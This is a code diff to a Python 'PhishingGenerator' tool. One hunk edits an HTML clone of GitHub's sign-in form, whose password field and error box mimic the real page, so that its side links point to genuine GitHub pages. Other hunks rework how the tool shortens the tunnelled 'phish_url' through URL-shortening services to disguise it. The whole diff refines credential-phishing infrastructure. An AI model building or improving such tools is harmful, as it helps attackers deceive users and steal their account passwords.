@@ -542,13 +542,13 @@ class PhishingGenerator:
                             '<div style="text-align:left;margin-bottom:16px;">' +
                                 '<div style="display:flex;justify-content:space-between;margin-bottom:6px;">' +
                                     '<label style="font-size:14px;font-weight:400;color:#1f2328;">Password</label>' +
-                                    '<a style="font-size:12px;color:#0969da;text-decoration:none;cursor:pointer;" id="ghForgot">Forgot password?</a>' +
+                                    '<a href="https://github.com/password_reset" target="_blank" style="font-size:12px;color:#0969da;text-decoration:none;">Forgot password?</a>' +
                                 '</div>' +
                                 '<input id="ghPass" type="password" style="width:100%;padding:5px 12px;font-size:14px;line-height:20px;border:1px solid #d0d7de;border-radius:6px;outline:none;background:#f6f8fa;" autocomplete="current-password">' +
                             '</div>' +
                             '<button id="ghSignin" style="width:100%;padding:6px 12px;font-size:14px;font-weight:500;color:#fff;background:#2da44e;border:1px solid #1a7f37;border-radius:6px;cursor:pointer;line-height:20px;">Sign in</button>' +
                             '<div style="margin-top:16px;padding-top:16px;border-top:1px solid #d0d7de;font-size:12px;color:#656d76;">' +
-                                '<span>New to GitHub? </span><a style="color:#0969da;text-decoration:none;cursor:pointer;font-weight:500;" id="ghCreate">Create an account</a>' +
+                                '<span>New to GitHub? </span><a href="https://github.com/signup" target="_blank" style="color:#0969da;text-decoration:none;font-weight:500;">Create an account</a>' +
                             '</div>' +
                             '<div id="ghError" style="display:none;margin-top:12px;padding:8px 12px;background:#fff1f0;border:1px solid #d1242f;border-radius:6px;font-size:12px;color:#d1242f;text-align:left;">Incorrect username or password.</div>' +
                         '</div>';
@@ -1210,15 +1210,16 @@ class PhishingGenerator:
     def _shorten_url_for_display(self, url):
         services = [
             ("cleanURI", lambda: requests.post("https://cleanuri.com/api/v1/shorten", data={"url": url}, timeout=8)),
-            ("TinyURL", lambda: requests.get(f"https://tinyurl.com/api-create.php?url={quote(url, safe='')}", timeout=8)),
         ]
         for name, fn in services:
             try:
                 r = fn()
-                s = r.text.strip()
-                if r.status_code == 200 and s and 'error' not in s.lower():
-                    console.print(f"[dim]🔗 Short: {s} ({name})[/]")
-                    return
+                if r.status_code == 200:
+                    data = r.json()
+                    s = data.get('result_url', '').strip()
+                    if s:
+                        console.print(f"[dim]🔗 Short: {s} ({name})[/]")
+                        return
             except:
                 continue
         console.print(f"[dim]🔗 Raw tunnel URL: {url}[/]")
@@ -1533,15 +1534,16 @@ class PhishingGenerator:
             shortened_url = None
             services = [
                 ("cleanURI", lambda: requests.post("https://cleanuri.com/api/v1/shorten", data={"url": phish_url}, timeout=8)),
-                ("TinyURL", lambda: requests.get(f"https://tinyurl.com/api-create.php?url={quote(phish_url, safe='')}", timeout=8)),
             ]
             for name, fn in services:
                 try:
                     r = fn()
-                    s = r.text.strip()
-                    if r.status_code == 200 and s and 'error' not in s.lower():
-                        shortened_url = s
-                        break
+                    if r.status_code == 200:
+                        data = r.json()
+                        s = data.get('result_url', '').strip()
+                        if s:
+                            shortened_url = s
+                            break
                 except Exception as e:
                     console.print(f"[dim]  {name} failed: {str(e)[:60]}[/]")
                     continue
